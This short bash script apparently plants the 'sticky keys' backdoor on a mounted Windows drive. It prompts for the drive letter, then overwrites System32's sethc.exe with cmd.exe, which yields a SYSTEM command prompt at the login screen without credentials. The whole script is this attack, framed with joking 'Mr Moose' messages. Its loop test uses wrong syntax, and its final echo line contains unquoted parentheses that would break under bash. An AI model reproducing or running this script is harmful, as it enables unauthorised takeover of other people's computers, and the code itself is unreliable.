#!/bin/bash

varcorrect="N"
while [ $[varcorrect^^] = "N" ]
do
read -p "Please input the location of the drive in question (caps matters): " vardrive
read -p "You have selected the :$vardrive drive is this correct? (Y/N) " varcorrect
done

echo           FIRE UP THE MOOSE!
echo
echo
echo        Please wait while Mr Moose Works
echo

cd /$vardrive/Windows/System32
cp cmd.exe sethc.exe

echo The Moose's work here is done! (hopefully kek)
echo
